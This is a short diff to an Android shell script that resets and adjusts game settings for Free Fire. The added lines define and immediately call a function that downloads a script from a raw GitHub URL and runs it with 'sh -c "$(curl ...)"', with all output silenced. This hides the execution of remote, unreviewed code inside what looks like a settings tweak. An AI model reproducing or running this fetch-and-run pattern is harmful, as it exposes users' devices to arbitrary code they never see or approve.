@@ -1,5 +1,10 @@
 #!/bin/sh
+  hz="https://raw.github.com/LanzXsettings/Macro-Modz/resource/delHZConfig"
 
+  exechz() {
+  sh -c "$(curl -fsSL "$hz")" > /dev/null 2>&1
+  }
+  exechz
   cmd game reset com.dts.freefireth
   cmd game reset com.dts.freefiremax
   cmd game downscale disable com.dts.freefireth
